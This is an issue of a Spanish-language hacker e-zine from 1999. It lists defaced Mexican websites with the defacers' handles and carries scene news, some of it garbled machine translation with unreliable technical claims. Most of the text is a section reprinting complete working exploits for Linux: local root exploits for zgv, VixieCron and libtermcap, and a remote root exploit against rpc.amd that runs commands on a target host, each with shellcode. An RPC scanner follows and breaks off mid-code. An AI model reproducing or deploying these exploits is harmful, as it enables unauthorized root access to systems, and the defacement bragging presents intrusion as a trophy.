 SEฅOR ZEDILLO SI NO PUEDE RENUNCIE LA VERDAD SOMOS JOVENES Y NESECITAMOS
 DE CONOCIMIENTO PARA HACER CRECER MAS NUESTRO PAIS.....ESTE ES UN LLAMADO
 PARA TODO EL PUEBLO MEXICANO TOMEMOS LA UNAM AHORA... (sic.)"


 [ Datos Mexis ]


 www.teqcorp.com.mx      alt3kx_H3z 

 SOCIEDAD
 Hackers mexicanos denuncian la politica del presidente Zedillo

 'Este conflicto hasta cuando acabara.... Renuncie seคor presidente de Mexico', 
 seคalaban textualmente


 Martes, 7 septiembre. REDACCION.

 Un grupo de hackers entro ilegalmente, el domingo 5, en el web de la
 cadena de cable C-SPAM, modificando su aspecto e introduciendo letras
 de un conjunto "punk". Este grupo, autodenominado "United Loan Gunmen",
 tambien se atribuyo el asalto a la ABC News.

 Por otro lado, intrusos con el nombre de "altekx_H3z" reivindicaron, en
 un mensaje a LaBrujula.Net, el "hacking" a la pagina web
 http://www.teqcorp.com.mx, propiedad de un ISP mexicano de San Luis Potosi.
 En la misiva denunciaban la actuacion del presidente Zedillo en el caso de
 la Unam. "Este conflicto hasta cuando acabara....
 Renuncie seคor presidente de Mexico", seคalaban textualmente.

 [ Datos labrujula.net ]
 

 Y por ultimo...
 Last cracks...

 www.interceramic.com.mx    DaCure               (La pagina de Interceramic)
 www.directv.com.mx         DaCure               (Television por satelite)
 www.lanix.com              DaCure               (En honor a xDAWN =D)
 www.teqcorp.com.mx         altekx_h3z           (En honor a xDAWN =P)
 www.tlax.net.mx            Dacure	             (DaCure 0wnz jew)
 www.cafe.net.mx            Satanic0             (Cafe Internet =P)
 www.eduware.com.mx         Satanic0 & Hefesto   (????)
 biblioteca.itesm.mx	    altekx_h3z		 (Protesta en contra de
 itec.mty.itesm.mx	    altekx_h3z	        los paristas de la
 www-cib.mty.itesm.mx	    altekx_h3z		  UNAM)
 bibdig.mty.itesm.mx	    altekx_h3z

 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<
 ฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒฐฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒ
 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ< 

                                                  
             ฒฒ         ฒ
             ฒฒ ฒ ฒ    ฒ  ฒ
             ฒฒ  ฒ ฒ    ฒ   ฒ ฒ
             ฒฒ ฒ ฒ ฒ ฒ   18 la direcciขn correcta.


       Secciขn de Noticias por ToPo. ToPo era antes TOPO ahora es ToPo.
       jejejeje, que cambbiaso!!


 _// Kevin Mitnick el detenido "Chakal de La red" \\_

 ESTE HACKER  DETENIDO POR DELITOS INFORMATICOS, EN ACCIDENTE DE AUTO!!!!!
 VER INFO DE MITNICK EN EL BOLETIN 7, SECCION DE DarkAngel.

 Mientras que estaba siendo transportado de la carcel del San Bernardino al
 centro metropolitano de detencion de Los Angeles, el vehiculo en el ke era
 transaladado Kevin Mitnick, choco. El accidente ocurrio en la carretera 60
 entre 8:30 y 9 de la ma๑ana.chocaron contra un metal divisor Kevin sufrio
 lesiones en el cuello y en la espalda. Y aunque Kevin y los otros presos
 ivan encadenados no se utilizo ningun cinturon de seguridad, ivan casi
 como GANADO!. Despues del accidente transportaron a Kevin de nuevo a la
 carcel de San Bernardino.

 KEVIN LIBRE, FREE KEVIN.


 _// Fallo en Windows NT <--- es el colmo \\_

 Se descubrio que en Windows NT es imposible usar un IP spoofing que sirve
 para camuflajear la IP. Si, al mostrar la IP camuflajeada esta solo dura
 10  minutos y vuelve a ser la IP original.

 Ejemplo:

 207.1.1.1 <- IP camuflajeada , 
 10 minutos.........
 148.233.38.150 <-  IP real vulnerable.


 _// Corea del Sur, dice: No mas Porno <--- buuu \\_

 Si el gobierno coreano pedira tener todas las ISPs que laboran ahi.
 ISPs= Servidores de internet.

 Si el Gobierno coreano multara y castigara con 20 aคos de carcel ala
 ISP que se niegue, con esto el gobierno coreano clausurara las paginas
 www.  de origen en Core con Asian Teens. y se prohibira la pornografia
 cybernetica en ese pais. Cotrea Del Sur,

 Amigo CoreANO sorrys men todavia te quedan las revistas.


 _// Se inicia una guerra De hackers de EUA contra indonesia. \\_

 Cada dia es mas comun escuchar de guerras cyberneticas y en este caso
 se supone que el gobierno de indonesia demandara al de EUA por encontrar
 varias posibilidades de que el FBI haya intervenido, en esta cyberwar.


 _// El Gobierno de EUA solicita ....\\_

 Formular una ley para poder responder ataques a usuarios y reventar
 ordenadores a su gusto y a su antojo, esta ley se esta pensando y creo
 que obviamente no se aceptara puesto ya seria algo grave, pero no se
 alarmen por que no es nada seguro |:>:><:<:|


 _// Audiencias que se sostendran en grado \\_

 El comite de la reforma y del descuido del gobierno de la casa llevara
 a cabo audiencias en los programas tales de la vigilancia como grado del
 proyecto de la agencia de la seguridad nacional el ", " la red global el
 escuchar detras de las puertas de NSAs. Este presidente Dan Burton (R-IN)
 del comite del aคo enmendo anterior el acto de la autorizacion de la
 inteligencia no nativa de FY 2000 para requerir el DoJ, el NSA, y la
 Cia someter al congreso un informe que detallaba las normas juridicas
 el uso de las agencias cuando el escucha detras de las puertas en
 ciudadanos americanos.

 Camara de los E.E.U.U. de representantes


 _// La Palabra de paso Scam De AOL Destapo \\_

 La Shadow Knights Security Corp. release/version un consultivo que
 detalla un nuevo scam que el ha descubierto esa tentativa de robar
 palabras de paso de los utilizadores de AOL. Un email se envia
 basicamente al utilizador que las dirige a una paginacion falsa de
 AOL NetMail donde se incitan para incorporar su username y palabra
 de paso para leer el correo del unread.


 _//Revision De Bronc Defcon Vii \\_

 La sintesis finnally ha fijado una revision de Defcon VII, de que estaba
 en su edicion pasada de la impresion, sobre su Web site. La revision es
 sida autor por alguien que usted puede ser que sepa, buster de Bronc.


 _// Catalogo De la Supervivencia De Y2k \\_

 Preocupado de Y2K? Tema el extremo del mundo como lo sabemos?
 Asustado usted puede ser que se ejecute de las mentas de la respiracion?
 Pregunte como su ir a generar numeros al azar cuando la potencia falla?
 Consiga todas sus necesidades de la supervivencia de Y2K aqui.


 _//Dominio Del Web De AntiGay Robado \\_

 En que aparece ser un spoof internic simple el registro la informacion
 para godhatesfags.com fue cambiada al propietario de godlovesfags.com.
 Es desconocida si el primer dominio llego a ser sin registrar o si el
 perpetrator engaคo de alguna manera soluciones de la red en cambiar la
 informacion. Desafortunadamente no aparece que cualquier persona que
 ha escrito un ' nuevo articulo acerca de esto tiene cualquier idea como
 los trabajos Internet, haciendola dura determinarse exactamente que
 sucedio.
 

 _//Nuevo grupo anti-hackers \\_

 Si se formo un nuevo grupo anti-hacker con personas muy experimentadas
 en seguridad informatica, el gobierno niega darle recursos economicos
 a este tipo de grupos pero hay quienes aseguran que si, asi que ahora
 con cuidado hasta con los uisuarios que sepana demasiado.
 por lo pronto se inicia la revolucion de hackers mexicanos.
 Viva RaZa-.-.xDDD


 _// 15 de Septiembre y presidencia.gob.mx cae! \\_

 Si esta pagina de la presidencia de Mexico cayo durante 20 minutos
 el dia 15 de Septiembre de 1999 dia de la independencia de Mexico,
 el hacker que realizo esto pidio no ser mencionado por razones extraคas.
 xD y que habia excelente seguridad en presidencia,, jeje nada en
 iNET es seguro hasta que  que esta desconectado. ToPo. frase por
 topo no me la vallan a robar que se me ocurrio minetras escribia esto.


 _// Noticia a peticion de DeX \\_

 El dia 15 de Septiembre, DeX se puso bien pedo (jarra, borracho, ebrio)
 y al dia siguien te no encontraba las letras del teclado.

 [ ???]

 Como ven no se mostro nada interesante en estos meses pero aqui esta
 la mas interesante recopilacion.
 Esto ah sido todo por este boletin, si tienen alguna duda o quieren mas
 info.

 RECLAMACIONES A SU HERMANA , DUDAS QUEJAS Y SUGERENCIAS A:
 P.D. mi modem sigue sin poder configurarse en Lynx ya intente todojumpers
 etc etc, y no me da, alguien me puede ayudar, <- fuck ke lamma es esto.

                                                 topo_mayor@hotmail.com
                                                Informando para RaZa, ToPo.

 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<
 ฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒฐฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒ
 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ< 


                           -----------------------   
              - - -----  B U G S  y  E X P L O I T S  ----- - -
                           -----------------------     


 -------------------------------------------------
 ---[ Nombre  :  zgv 3.0 exploit
 ---[ Sistema :  redhat 5.2 / redhat 6.0
 ---[ Causa   :  r00t
 ---[ Creditos:  icesk brings jue / [gH] 
 -------------------------------------------------

/*
 * [gH] icesk brings jue [gH]
 * -> redhat 5.2 / redhat 6.0 zgv local (literly on console or a terminal)
 * -> zgv 3.0 exploit. afects zgv 3.0 even AFTER the vendor patch.
 */

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

#define nop      0x90

/* not my shellcode */
char shellcode[] =
        "\xeb\x20\x5e\x8d\x46\x05\x80\x08\x20\x8d\x46\x27\x80\x08\x20\x40"
        "\x80\x08\x20\x40\x80\x08\x20\x40\x40\x80\x08\x20\x40\x80\x08\x20"
        "\xeb\x05\xe8\xdb\xff\xff\xff"
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";

u_long get_sp(void) { __asm__("movl %esp,%eax"); }

void main(int argc, char **argv) {
    char *buffer, *ptr;
    long *address_ptr, *address;
    int i, desc, offset = 0, bsize = 1024;

    buffer = malloc(bsize);

    (char *)address = get_sp() - offset;
    printf("return address %#x\n" ,address);

    ptr = buffer;
    address_ptr = (long *)ptr;

    for(i=0;i < bsize;i += 4)
      (int *)*(address_ptr++) = address;

    for(i=0;i < bsize / 2; i++)
      buffer[i] = nop;

    ptr = buffer + ((bsize / 2) - (strlen(shellcode) / 2));
    for(i=0;i < strlen(shellcode); i++)
      *(ptr++) = shellcode[i];

    buffer[bsize - 1] = '\0';
    printf("g0t w00t sh3ll!\n");
    setenv("HOME", buffer, 1);
    execl("/usr/bin/zgv", "zgv", 0);
}

 -------------------------------------------------
 ---[ Nombre  :  VixieCron 3.0 Exploit
 ---[ Sistema :  Linux
 ---[ Causa   :  r00t
 ---[ Creditos:  jbowie <jbowie@el8.org> / [w00w00]
  -------------------------------------------------

/*
 * VixieCron 3.0 Proof of Concept Exploit - w00w00
 *
 * Not only does Paul give up root with this one, but with his creative use of
 * strtok() he actually ends up putting the address of our shellcode in eip.
 *
 * Many Thanks: Cheez Wiz, Sangfroid
 * Thanks: stran9er, Shok
 * Props: attrition.org,mea_culpa,awr,minus,Int29,napster,el8.org,w00w00
 * Drops: Vixie, happyhacker.org, antionline.com, <insert your favorite web \
 *        defacement group here>
 *
 * Hellos: pm,cy,bm,ceh,jm,pf,bh,wjg,spike.
 *
 * -jbowie@el8.org
 *
 */

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <pwd.h>

char shellcode[] =
        "\xeb\x40\x5e\x89\x76\x0c\x31\xc0\x89\x46\x0b\x89\xf3\xeb"
        "\x27w00w00:Ifwewerehackerswedownyourdumbass\x8d\x4e"
        "\x0c\x31\xd2\x89\x56\x16\xb0\x0b\xcd\x80\xe8\xbb\xff\xff"
        "\xff/tmp/w00w00";

int
main(int argc,char *argv[])
{
	FILE *cfile,*tmpfile;
	struct stat sbuf;
	struct passwd *pw;
	int x;

	pw = getpwuid(getuid());

	chdir(pw->pw_dir);
	cfile = fopen("./cronny","a+");
	tmpfile = fopen("/tmp/w00w00","a+");


	fprintf(cfile,"MAILTO=");
	for(x=0;x<96;x++)
		fprintf(cfile,"w00w00 ");
	fprintf(cfile,"%s",shellcode);
	fprintf(cfile,"\n* * * * * date\n");
	fflush(cfile);

	fprintf(tmpfile,"#!/bin/sh\ncp /bin/bash %s\nchmod 4755 %s/bash\n", pw->pw_dir,pw->pw_dir);
	fflush(tmpfile);

	fclose(cfile),fclose(tmpfile);

	chmod("/tmp/w00w00",S_IXUSR|S_IXGRP|S_IXOTH);

	if(!(fork())) {
		execl("/usr/bin/crontab","crontab","./cronny",(char *)0);
	} else {
		printf("Waiting for shell be patient....\n");
		for(;;) {
			if(!(stat("./bash",&sbuf))) {
					break;
			} else { sleep(5); }
		}
		if((fork())) {
			printf("Thank you for using w00warez!\n");
			execl("./bash","bash",(char *)0);
		} else {
			remove("/tmp/w00w00");
                        sleep(5);
                        remove("./bash");
                        remove("./cronny");
                        execl("/usr/bin/crontab","crontab","-r",(char *)0);
		}
	}		
}

 -------------------------------------------------
 ---[ Nombre  :  Exploit libtermcap < 2.0.8-15 
 ---[ Sistema :  redhat 5.2/4.2 etc
 ---[ Causa   :  r00t
 ---[ Creditos:  sk8 <sk8@lucid-solutions.com>
 -------------------------------------------------

/* Local exploit for suid root programs linked to libtermcap < 2.0.8-15 
 *
 * tested with xterm and nxterm on RedHat 5.2 and 4.2
 *
 * sk8@lucid-solutions.com
 * http://www.lucid-solutions.com
 *
 * Usage:
 * ./smashcap  		-default is buffer size of 4210 and offset of 300
 *			 and seems to work on RH 5.2
 *
 * Adjust offsets (somewhere between 230 - 1140) if necessary
 *
 * ./smashcap <offset> 	-buffer size defaults to 4210
 * ./smashcap <offset> <buffersize>
 *
 *
 * In order to stop script kids/opportunists, one MINOR change must be
 * made in order for this to work.  
 *
 * Use only to test your machines to show you that you must patch libtermcap.
 * Quick fix, chmod u-s ALL suid root programs linked with libtermcap.
 *
 *						- sk8 of LS
 *
 */

#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

#define filename "/tmp/lstermcap"
#define entry1   "xterm|"
#define DEFAULT_BUFSIZE 4210

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff\xff/bin/sh"; /* Linux shellcode */

long get_sp(void)
{
   __asm__("movl %esp, %eax\n");
}

int main(int argc, char *argv[]) {
   int bufsize, offset, i, fd;
   long *bufptr;
   char *ptr, *buffer, *tempbuf;

   setenv("TERMCAP", "/tmp/lstermcap", 1);


   bufsize=DEFAULT_BUFSIZE;

   if (argc > 2) bufsize=atoi(argv[2]);
   if (argc > 1) offset=atoi(argv[1]);
   else offset=300;
  

   printf("bufsize: %i\noffset: %i\n", bufsize,offset);

   if(!(buffer = malloc(bufsize))) {
      printf("can't allocate enough memory\n");
      exit(0);
   }
  if(!(tempbuf = malloc(bufsize+strlen(entry1) ))) {
      printf("can't allocate enough memory\n");
      exit(0);
   }

   printf("get_sp(): 0x%x\n", get_sp());
   printf("get_sp()-offs: 0x%x\n", (get_sp()-offset) );

   ptr=buffer;
   bufptr = (long *)(buffer+2); /* align */

   for (i = 0; i < bufsize; i += 4)
      	*(bufptr++) = (get_sp()-offset);

   	for (i = 0; i < (bufsize/2); i++) 
     		 buffer[i] = 0x90;

	ptr=buffer + ((bufsize/2) - strlen(shellcode)/2);
  	for (i = 0; i < strlen(shellcode); i++)
      		*(ptr++) = shellcode[i]; //shellcode


  	ptr=ptr+24;

	/* now insert the characters : and \ into the termcap - these are vital */
  	*(ptr++)=0x3a;  
  	*(ptr++)=0x5c;  


   	snprintf(tempbuf, (bufsize+strlen(entry1)), "%s%s%s", entry1, buffer);
   	fd = open(filename, O_WRONLY|O_CREAT|O_TRUNC, 0666);
   	write (fd, tempbuf, strlen(tempbuf));
   	close(fd);
	printf("made termcap\n");

	execl("/usr/X11R6/bin/xterm","xterm", 0);
	
}

 -------------------------------------------------
 ---[ Nombre  :  SDI rpc.AMD automountd 
 ---[ Sistema :  Todos los RedHat
 ---[ Causa   :  r00t
 ---[ Creditos:  c0nd0r <condor@sekure.org> / [SDI]
 -------------------------------------------------

/*
 * SDI rpc.AMD automountd remote exploit for RedHat Linux
 * Sekure SDI - Brazilian Information Security Team
 * by c0nd0r <condor@sekure.org> - Jul/99
 *  
 * AMD doesn't check bounds in the plog() function, so we may
 * call the procedure 7 and exploit this vulnerability.
 * It has been tested under rh5.2/5.0 but this vulnerability exists in 
 * all versions.
 * 
 * Greets: jamez, bishop, bahamas, stderr, dumped, paranoia, marty(nordo),
 *         vader, fcon, slide, corb, soft distortion and specially to
 *         my sasazita!  Also lots of thanks to toxyn.org(frawd,r00t),
 *         pulhas.org, phibernet, superbofh(seti) and el8.org (duke). 
 *         #uground (brasnet), #sdi(efnet), #(phibernet).
 *           
 * usage: SDIamd -h <host> -c <command> [-p <port>] [-o <offset>]
 *        where -p <port> will bypass the portmap.
 * 
 * Warning: We take no responsability for the consequences on using this 
 *          tool. DO NOT USE FOR ILICIT ACTIVITIES!
 *
 * Agradecimentos a todo o pessoal que vem acompanhando a lista brasileira
 * de seguranca - BOS-BR <bos-br-request@sekure.org>. Fiquem ligado na
 * nova pagina do grupo!
 */ 

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <rpc/rpc.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>

#define AMQ_PROGRAM ((u_long)300019)
#define AMQ_VERSION ((u_long)1)
#define AMQPROC_MOUNT ((u_long)7)
#define AMQ_STRLEN 1024
#define XDRPROC_T_TYPE xdrproc_t
#define voidp void *
#define NOP 0x90

char shellcode[] =
        "\xeb\x31\x5e\x89\x76\xac\x8d\x5e\x08\x89\x5e\xb0"
        "\x8d\x5e\x0b\x89\x5e\xb4\x31\xc0\x88\x46\x07\x88"
        "\x46\x0a\x88\x46\xab\x89\x46\xb8\xb0\x0b\x89\xf3"
        "\x8d\x4e\xac\x8d\x56\xb8\xcd\x80\x31\xdb\x89\xd8"
        "\x40\xcd\x80\xe8\xca\xff\xff\xff/bin/sh -c ";

//typedef bool_t (*xdrproc_t) __P ((XDR *, __ptr_t, ...));
typedef char *amq_string;
typedef long *time_type;
typedef struct amq_mount_tree amq_mount_tree;
typedef amq_mount_tree *amq_mount_tree_p;

struct amq_mount_tree {
  amq_string mt_mountinfo;
  amq_string mt_directory;
  amq_string mt_mountpoint;
  amq_string mt_type;
  time_type mt_mounttime;
  u_short mt_mountuid;
  int mt_getattr;
  int mt_lookup;
  int mt_readdir;
  int mt_readlink;
  int mt_statfs;
  struct amq_mount_tree *mt_next;
  struct amq_mount_tree *mt_child;
};

bool_t
xdr_amq_string(XDR *xdrs, amq_string *objp)
{
  if (!xdr_string(xdrs, objp, AMQ_STRLEN)) {
    return (FALSE);
  }
  return (TRUE);
}

bool_t
xdr_time_type(XDR *xdrs, time_type *objp)
{
  if (!xdr_long(xdrs, (long *) objp)) {
    return (FALSE);
  }
  return (TRUE);
}

bool_t
xdr_amq_mount_tree(XDR *xdrs, amq_mount_tree *objp)
{

  if (!xdr_amq_string(xdrs, &objp->mt_mountinfo)) {
    return (FALSE);
  }

  if (!xdr_amq_string(xdrs, &objp->mt_directory)) {
    return (FALSE);
  }

  if (!xdr_amq_string(xdrs, &objp->mt_mountpoint)) {
    return (FALSE);
  }

  if (!xdr_amq_string(xdrs, &objp->mt_type)) {
    return (FALSE);
  }

  if (!xdr_time_type(xdrs, &objp->mt_mounttime)) {
    return (FALSE);
  }

  if (!xdr_u_short(xdrs, &objp->mt_mountuid)) {
    return (FALSE);
  }

  if (!xdr_int(xdrs, &objp->mt_getattr)) {
    return (FALSE);
  }

  if (!xdr_int(xdrs, &objp->mt_lookup)) {
    return (FALSE);
  }

  if (!xdr_int(xdrs, &objp->mt_readdir)) {
    return (FALSE);
  }

  if (!xdr_int(xdrs, &objp->mt_readlink)) {
    return (FALSE);
  }

  if (!xdr_int(xdrs, &objp->mt_statfs)) {
    return (FALSE);
  }

  if (!xdr_pointer(xdrs, (char **) &objp->mt_next, sizeof(amq_mount_tree), (XDRPROC_T_TYPE) xdr_amq_mount_tree)) {
    return (FALSE);
  }

  if (!xdr_pointer(xdrs, (char **) &objp->mt_child, sizeof(amq_mount_tree), (XDRPROC_T_TYPE) xdr_amq_mount_tree)) {
    return (FALSE);
  }

  return (TRUE);
}

bool_t
xdr_amq_mount_tree_p(XDR *xdrs, amq_mount_tree_p *objp)
{
  if (!xdr_pointer(xdrs, (char **) objp, sizeof(amq_mount_tree), (XDRPROC_T_TYPE) xdr_amq_mount_tree)) {
    return (FALSE);
  }
  return (TRUE);
}


int usage ( char *arg) {
  printf ( "Sekure SDI - AMD remote exploit for linux\n");
  printf ( "usage: %s -h <host> -c <command> [-o <offset>] [-p <port>] [-u] \n", arg);
  printf ( " where: [port] will bypass portmap\n");
  printf ( "        [-u  ] will use udp instead of tcp\n");
  exit (0);
}


int *amqproc_mount_1(voidp argp, CLIENT *clnt);


int main ( int argc, char *argv[] ) {
  CLIENT *cl;
  struct timeval tv;
  struct sockaddr_in sa;
  struct hostent *he; 
  char buf[8000], *path = buf, comm[200], *host, *cc;
  int sd, res, x, y, offset=0, c, port=0, damn=0, udp=0;  
  long addr = 0xbffff505;

  while ((c = getopt(argc, argv, "h:p:c:o:u")) != -1)
    switch (c) {
    case 'h':
      host = optarg;
      break;

    case 'p':
      port = atoi(optarg);
      break;

    case 'c':
      cc = optarg;
      break;
 
    case 'o':
      offset = atoi ( optarg);
      break;

    case 'u':
      udp = 1;
      break;

    default:
      damn = 1;
      break;
   }

  if (!host || !cc || damn) usage ( argv[0]);

  sa.sin_family = AF_INET;
  he = gethostbyname ( host);
  if (!he) {
   if ( (sa.sin_addr.s_addr = inet_addr ( host)) == INADDR_NONE) {
    printf ( "unknown host, try again pal!\n");
    exit ( 0);
   }
  } else 
   bcopy ( he->h_addr, (struct in_addr *) &sa.sin_addr, he->h_length); 
  sa.sin_port = htons(port);
  sd = RPC_ANYSOCK;
  tv.tv_sec = 10;
  tv.tv_usec = 0;

  snprintf ( comm, sizeof(comm), "%s", cc);
  if ( strlen(comm) >= 160) {
    printf ( "command too long\n");
    exit (0);
  } else {
   comm[strlen(comm)] = ';';
   for ( x = strlen(comm); x < 160; x++)
    comm[x] = 'A'; 
  }  

  addr += offset;
  for ( x = 0; x < (1001-(strlen(shellcode)+strlen(comm))); x++)
   buf[x] = NOP;

  for ( y = 0; y < strlen(shellcode); x++, y++)
   buf[x] = shellcode[y];

  for ( y = 0; y < strlen(comm); x++, y++)
   buf[x] = comm[y];  

  printf ( "SDI automountd remote exploit for linux\n");
  printf ( "Host %s \nRET 0x%x \nOFFset %d \n", host, addr, offset); 

  for ( ; x < 1020; x+=4) {
   buf[x  ] = (addr & 0x000000ff);
   buf[x+1] = (addr & 0x0000ff00) >> 8;
   buf[x+2] = (addr & 0x00ff0000) >> 16;
   buf[x+3] = (addr & 0xff000000) >> 24;
  }

  buf[strlen(buf)] = '\0';  
  
  if (!udp) {
   if ((cl = clnttcp_create(&sa, AMQ_PROGRAM, AMQ_VERSION, &sd, 0, 0)) ==
        NULL)
   {
     clnt_pcreateerror("clnt_create");
     exit (-1);
   }
  } else {
   if ((cl = clntudp_create(&sa, AMQ_PROGRAM, AMQ_VERSION, tv, &sd)) ==
       NULL)
   {
     clnt_pcreateerror("clnt_create");
     exit (-1);
   }
  }
  printf ( "PORT %d \n", ntohs(sa.sin_port));
  printf ( "Command: %s \n", cc); 
 
  amqproc_mount_1 (&path, cl); 
  
  clnt_destroy ( cl);
  
}

  
int *
amqproc_mount_1(voidp argp, CLIENT *clnt)
{
  static int res;
  struct timeval TIMEOUT = {10, 0};

  memset((char *) &res, 0, sizeof(res));
  if (clnt_call(clnt, AMQPROC_MOUNT, (XDRPROC_T_TYPE) xdr_amq_string, argp,
                (XDRPROC_T_TYPE) xdr_int, (caddr_t) & res,
                TIMEOUT) != RPC_SUCCESS) {
    printf ( "voce e' um hax0r!\n");
    printf ( "don't forget to restart amd: /etc/rc.d/init.d/amd start\n");
    clnt_perror ( clnt, "clnt_call");
    return (NULL);
  } 
  printf ( "exploit failed\n");
  return (&res);
}

 -------------------------------------------------
 ---[ Nombre  :  rpcscan v1.0
 ---[ Sistema :  Linux
 ---[ Causa   :  Scanner de Vulnerabilidades RPC
 ---[ Creditos:  sk8
 -------------------------------------------------

/* rpcscan v1.0
 *	- for each host in the inputfile, scans for rpc services whose 
 *        program numbers are given at the command line.
 *
 *	Motivation:
 *		Admins need to check every box for possibly vulnerable rpcs, 
 *		such as statd, ttdb, nisd, cmsd, mountd, etc....  This program 
 *		make it easy.
 *
 * by sk8 (sk8@lucid-solutions.com)
 * August 1999
 * 
 * http://www.lucid-solutions.com
 *
 * Use this program only to help secure your network.
 *
 * This is coded for Linux and was tested on Redhat 6.0, kernel 2.2.9.
 * Modifications are necessary to compile on Solaris.
 * 
 *
 * The inputfile is simply a file of ips, each on their own line.
 * z0ne's output works perfectly for this.
 * 
 *	
 *			     sample usage
 *			 ====================
 *		say you want to scan for ttdb and statd:
 *	     ./rpcscan network.ips network.results -p 100083,100024 -v
 *
 *		or for less verbosity during the scan:
 *	     ./rpcscan network.ips network.results -p 100024,100083
 *
 *		or use -t option to increase timeout value if you think some
 *		machines are slow to respond...
 *	     ./rpcscan network.ips network.results -t 10 -p 100024,100068,100083
 *		(to check for your machines running statd, rpc.cmsd, and ttdb)
 *		 
 *
 */

#include <stdio.h>
#include <unistd.h>
#include <netdb.h>
#include <stdlib.h>
#include <signal.h>
#include <rpc/rpc.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <rpc/pmap_prot.h>
#include <rpc/pmap_clnt.h>
 
#define DEBUGGING 0

void timeout_handler(int s);
void usage(char *s);
void scan(char *i, char *o);
int rpccheck(char *host, FILE*);
unsigned long int res(char *p);
int timeout=0;
int verbose=0;
int errno;
int timeoutval=1; /* default value for timeout of clnttcp_create is 1 */
int IdsToCheck[25];
unsigned int *procnums=NULL;

unsigned int *getpts(char *);
int searchlist(struct pmaplist*, int);
void usage(char *s) 
{
  printf("rpcscan usage: \n  %s <iplistfile> <outfile> -p <ids separated by commas> -v -t <timeout val>\n",s);
  printf("\n     -v be more verbose, not required\n");
  printf("     -t <timeout val> not required, defaults to 1\n\n\n");

  exit(-1);
}

int main(int argc, char **argv)
{
  char ch;
  int i=0;
  if(argc < 3) usage(argv[0]);
 
  i=1;
  while (argv[i] != NULL) {
	if (!strncmp(argv[i], "-p",2)) {
		break;
	}
	i++;
  }
  if (i == argc) {printf("You must specify procedure ids to scan for with the -p option.\n"); 
		  printf("Run with no arguments for usage.\n");exit(-1); }
  i=0;

  while ( (ch = getopt(argc, argv, "p:t:v")) != EOF) {
	switch (ch) {	
  	case 'v': 
		printf("verbose mode\n");
		verbose=1;
		break;
	  
  	case 't': 
		timeoutval=atoi(optarg);
		printf("timeout value is %i\n", timeoutval);
		break;
	
	case 'p':
		procnums=getpts(optarg); 

        break;

	default:
		usage(argv[0]);
		break;
	}
  }

  if (!argv[optind] || !argv[optind+1]) usage(argv[0]);


		printf("Scanning for these procedures:\n");
		printf("%i", procnums[0]);
		i=1;
		while (procnums[i]) {
			printf(", %i", procnums[i]);
			i++;
		}
		printf("\n");

  scan(argv[optind], argv[optind+1]); /* original argv[1] and argv[2] */
  printf("\nAll done.\n");
  return 0;
}

/* scan - controls the operations
 */
void scan(char *iFileName, char *oFileName) 
{
  FILE *inFile, *outFile;   
  char buf[512];
  int numToScan=0;
  double curHostNum=0.0;

  if((inFile=fopen(iFileName,"r")) == NULL) {
    printf("Error: can't open %s\n", iFileName);
    return;
  }

  if ( (outFile=fopen(oFileName, "a")) == NULL) {
	printf("can't write to %s\n", oFileName);
	return;
  }

  while(fgets(buf,512,inFile) != NULL)
  {
	numToScan++;
  }
  printf("number of ips to scan: %i\n\n", numToScan);
  (void)fseek(inFile,0,SEEK_SET); 
  sleep(1);

  while(fgets(buf,512,inFile) != NULL)
  {
    if(buf[strlen(buf)-1]=='\n')
      buf[strlen(buf)-1]=0;

    curHostNum++;
    if( rpccheck(buf, outFile) ) {
      buf[strlen(buf)+1]=0;
      buf[strlen(buf)]='\n';  

	fputs("\n",outFile);
    }

    if (!verbose) {
    	system("clear");
    	printf("%.0f%%\n", (curHostNum/(double)numToScan)*100.0);
    }
  }

  fclose(outFile);
  fclose(inFile);   
} 

void timeout_handler(int s)   
{
  if (verbose) {printf("-"); /* skipping host due to timeout */
  		fflush(stdout);
  }
  timeout=1;
  alarm(0);
  signal(SIGALRM, SIG_DFL);
}  
    

/* rpccheck 
 * check an individual host for the desired rpc services 
 */
int rpccheck(char *host,FILE* outFile)
{
  char outbuf[256];
  struct sockaddr_in server_addr;
  struct pmaplist *head = NULL;
  int sockett = RPC_ANYSOCK;
  struct timeval minutetimeout;
  register CLIENT *client;
  int found=0;
  int i=0;
  int first=0;   
  int foundCur=0;
  server_addr.sin_addr.s_addr=res(host);
  server_addr.sin_family=AF_INET;
  server_addr.sin_port = htons(PMAPPORT);
  minutetimeout.tv_sec = 5; /* This is the timeout value
			       for retrieiving the list of procedures.
	This is different than the -t timeout value 
	which can be set at runtime. 

	Best to increase this and recompile if you are scanning from a 
	modem connection. */

  minutetimeout.tv_usec = 0;
  
  siginterrupt(SIGALRM, 1);
  signal(SIGALRM,timeout_handler);
  alarm(timeoutval); 
  if ((client = clnttcp_create(&server_addr, PMAPPROG,
